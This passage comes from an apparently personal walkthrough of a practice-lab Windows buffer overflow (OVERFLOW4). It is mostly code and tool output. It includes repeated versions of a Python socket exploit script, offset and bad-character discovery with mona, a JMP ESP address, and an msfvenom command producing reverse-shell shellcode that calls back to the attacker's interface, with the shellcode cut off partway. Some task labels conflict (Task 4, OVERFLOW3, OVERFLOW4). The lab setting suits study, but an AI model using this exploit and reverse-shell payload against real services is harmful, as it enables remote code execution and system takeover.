Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D

```


13. In Kali. Edit the script exploit.py and add the output of the msf-pattern.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW4 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


14. In target machine. Immunity Debugger > Debug > Restart > Play.


15. In Kali. Execute the exploit.py.

![800](img/Pasted%20image%2020240821150355.png)


16. Immunity Debugger. EIP 70433570.

![800](img/Pasted%20image%2020240830150129.png)


17. In Kali. Get the offset value of the EIP.

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_offset -l 2500 -q 70433570
[*] Exact match at offset 2026
```

EIP Offset is 2026.

	Task 5
		a. What is the EIP offset for OVERFLOW4?
			2026


18. In Kali. Edit the exploit.py. Add the offset 2026 and put a retn to be reflected, can use "BBBB"

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW4 "  # The command or identifier expected by the target service
offset = 2026            # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


19. In target machine. Immunity Debugger > Debug > Restart > Play.


20. In Kali. Execute exploit.py.

![800](img/Pasted%20image%2020240821152534.png)


21. Immunity Debugger, showing EIP 42424242. Note the value ESP 01AAFA30.

![800](img/Pasted%20image%2020240830153010.png)


22. In Immunity Debugger. Create a BADCHARS using mona. By default the syntax \\x00 is a BADCHAR.

`!mona bytearray -b "\x00"

![800](img/Pasted%20image%2020240830153209.png)


23. Creating bad chars. In Kali. By using a python script. Generate a string of bad chars from \\x01 to \\xff.

```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00


```


24. Using the generated bad chars, copy and edit the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW4 "  # The command or identifier expected by the target service
offset = 2026             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


25. In target machine. Immunity Debugger > Debug > Restart > Play.


26. Execute exploit.py

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 exploit.py
Sending evil buffer...
Done!
```


27. In Immunity Debugger.  ESP 0183FA30.

![800](img/Pasted%20image%2020240830153458.png)


28. In Immunity Debugger. Run the mona command to compare the bin and ESP value.

`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>

![800](img/Pasted%20image%2020240830153612.png)

mona Memory comparison results, item 0
 Address=0x0183fa30
 Status=Corruption after 168 bytes
 BadChars=00 a9 aa cd ce d4 d5
 Type=normal
 Location=Stack


29. Based on the output 00 a9 aa cd ce d4 d5. Only use 00 a9 cd d4 to be excluded in creating the bad chars. Edit the create.py.


```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00 a9 cd d4".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```


```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xce\xcf\xd0\xd1\xd2\xd3\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00\xa9\xcd\xd4
```

	Task 4
		b. In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW3?
			\x00\xa9\xcd\xd4


30. In target machine. Immunity Debugger. Tell mona to update the bytearray.

`!mona bytearray -b "\x00\xa9\xcd\xd4"

![800](img/Pasted%20image%2020240830155509.png)

![800](img/Pasted%20image%2020240830155623.png)


31. In target machine. Immunity Debugger > Debug > Restart > Play.


32. Edit the exploit.py with the bad chars. Then execute the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW4 "  # The command or identifier expected by the target service
offset = 2026             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xce\xcf\xd0\xd1\xd2\xd3\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```

![](img/Pasted%20image%2020240829171740.png)


31. Immunity Debugger. Compare using mona.

** Do not restart Immunity Debbuger.

`!mona compare -f C:\mona\oscp\bytearray.bin -a esp

![800](img/Pasted%20image%2020240830155840.png)


32. Immunity Debugger > Debug > Restart


33. Use the command mona jmp, the esp and the excluded bad chars.

`!mona jmp -r esp -cpb "\x00\xa9\xcd\xd4"

Go to Log > 
Select and double click Log Data

![800](img/Pasted%20image%2020240830160034.png)

Showing ESP 625011AF

![800](img/Pasted%20image%2020240830160110.png)


34. Create shellcode using msfvenom

`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f python -v "shellcode"

`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b “\x00\xa9\xcd\xd4” -f **c**`

```shell
┌──(root㉿kali)-[/transfer]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f python -v "shellcode"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xba\xdf\xf8\xfc\x5d\xdb\xc6\xd9\x74\x24\xf4"
shellcode += b"\x5b\x33\xc9\xb1\x52\x31\x53\x12\x03\x53\x12"
shellcode += b"\x83\x34\x04\x1e\xa8\x36\x1d\x5d\x53\xc6\xde"
shellcode += b"\x02\xdd\x23\xef\x02\xb9\x20\x40\xb3\xc9\x64"
shellcode += b"\x6d\x38\x9f\x9c\xe6\x4c\x08\x93\x4f\xfa\x6e"
shellcode += b"\x9a\x50\x57\x52\xbd\xd2\xaa\x87\x1d\xea\x64"
